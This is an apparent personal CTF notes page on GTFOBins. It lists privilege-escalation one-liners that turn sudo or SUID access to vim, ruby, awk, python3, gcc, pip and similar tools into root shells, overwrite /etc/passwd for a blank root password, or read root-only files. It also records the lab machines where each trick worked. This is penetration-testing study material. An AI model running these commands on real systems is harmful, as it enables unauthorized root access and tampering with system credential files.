---
type: tool
category: reference
related: ["[[sudo-abuse]]", "[[suid-enumeration]]"]
---

# GTFOBins

Curated list of Unix binaries that can be abused to break out of restricted contexts (sudo/SUID).

## How it's used

After `sudo -l` or a SUID scan reveals an allowed binary (e.g. `vim`, `ruby`), look it up to get a ready-made shell payload.

## Example payloads

```sh
sudo vim -c ':!/bin/sh' /dev/null
sudo ruby -e 'exec "/bin/sh"'
sudo -u <user> /sbin/debugfs -w <image>   # then: debugfs: !/bin/bash
sudo -u <user> man man                    # then: !/bin/bash
sudo -u <user> nmap --script=/tmp/x.nse   # NSE os.execute("/bin/sh")
sudo chown $(id -u):$(id -g) /etc/passwd  # own passwd → blank root password
env /bin/sh -p                            # SUID env → root shell
sudo dos2unix -f -n /tmp/passwd.new /etc/passwd  # overwrite passwd → blank root
sudo php -r 'system("/bin/sh -i")'        # sudo php → shell
sudo env /bin/bash                         # sudo env → root shell
sudo awk 'BEGIN {system("/bin/sh")}'       # sudo awk → shell (as the -u target)
sudo vim -c ':!/bin/bash'                  # sudo vim → shell
sudo file -f /root/secret.txt             # file-read: each line echoed in the error output
curl file:///tmp/passwd -o /etc/passwd    # SUID curl: read one file, write another AS ROOT
sudo pip3 install .                        # dir with malicious setup.py → code runs as root
sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'  # sudo python3 → shell
sudo lua -e 'os.execute("/bin/bash")'      # sudo lua → shell
sudo gcc -wrapper /bin/bash,-s x           # sudo gcc → shell (the -wrapper trick)
sudo -u <user> /usr/bin/ash                # a pinned *shell* needs no entry — running it is the payload
```

- Not every entry is a **shell**: `file`'s GTFOBins page has a *file-read* function — a sudo-allowed reader of a root-only file leaks its contents (and with them, often a password) even though you never get code execution ([[dance-samba]], [[sudo-abuse]]).
- Some entries are **file writers** rather than readers or shells: SUID `curl` (`file://` in, `-o` out) and `dos2unix -f -n` both overwrite `/etc/passwd` ([[chmod-4755]], [[dark]], [[bruteshock]]).
- Some are **code runners dressed as tools**: `pip install .` executes the target directory's `setup.py` — and when the sudo rule ends in `install *`, the directory is *yours* to choose ([[pkgpoison]], [[sudo-abuse]]).
- Three file kinds to check for every allowed binary: **shells** (ash — nothing to look up), **interpreters** (lua, ruby, `-e` one-liners), **compilers** (`gcc -wrapper`). Six sudo rules on [[elevator]] hit all three categories plus `env` and sudo itself — GTFOBins is the whole escalation.

## Seen in

[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]], [[duque]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[dance-samba]], [[dark]] (curl `file://` + `-o`), [[file]] (`awk` → julen, `env` → iker, then a pinned `python3 script.py` where the payload goes *inside* the script), [[amor]] (`ruby -e 'exec "/bin/bash"'` → root), [[secretjenkins]] (python3 `-c` pivot → pinguinito, then the pinned-script overwrite → root), [[pkgpoison]] (`pip3 install *` → malicious `setup.py` → root), [[elevator]] (the full tour: `env`, pinned `ash` shell, `ruby`, `lua`, `gcc -wrapper`, then `sudo` itself — six rules, six floors), [[pequeñas-mentirosas]] (python3 `-c` `os.execl` → root, second sighting of the same one-liner)
